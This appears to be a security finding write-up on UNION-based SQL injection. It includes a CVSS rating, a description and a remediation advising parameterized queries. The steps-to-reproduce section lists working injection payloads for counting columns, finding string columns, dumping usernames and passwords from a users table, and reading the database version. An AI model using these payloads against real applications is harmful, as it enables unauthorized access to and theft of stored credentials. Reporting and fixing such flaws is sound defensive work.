# SQL Injection - UNION-Based Data Retrieval

**Title:** UNION-based SQL Injection for Data Extraction

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** SQL Injection

**Target:** Category or search parameter (e.g. ?category=1)

## Impact

Allows attackers to extract sensitive data from the database, including usernames and passwords, by appending a UNION SELECT to the original query.

## Description

The application is vulnerable to UNION-based SQL injection. By determining the number of columns and using NULL placeholders, an attacker can retrieve data from other tables such as the users table.

## Steps to Reproduce

1. Determine the number of columns:
   ```
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ```
   or
   ```
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ```

2. For Oracle databases, use FROM DUAL:
   ```
   ' UNION SELECT NULL FROM DUAL--
   ```

3. Find usable columns with strings:
   ```
   ' UNION SELECT 'a',NULL,NULL,NULL--
   ' UNION SELECT NULL,'a',NULL,NULL--
   ```

4. Retrieve data:
   ```
   ' UNION SELECT username, password, NULL FROM users--
   ```
   or combine values:
   ```
   ' UNION SELECT username || '~' || password FROM users--
   ```

5. Database enumeration:
   - Version: `' UNION SELECT @@version--`
   - Tables: Use information_schema

## Recommendation

Use parameterized queries/prepared statements exclusively. Never build SQL queries with string concatenation of user input. Apply the principle of least privilege to the database user.

## References

- PortSwigger SQL Injection Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
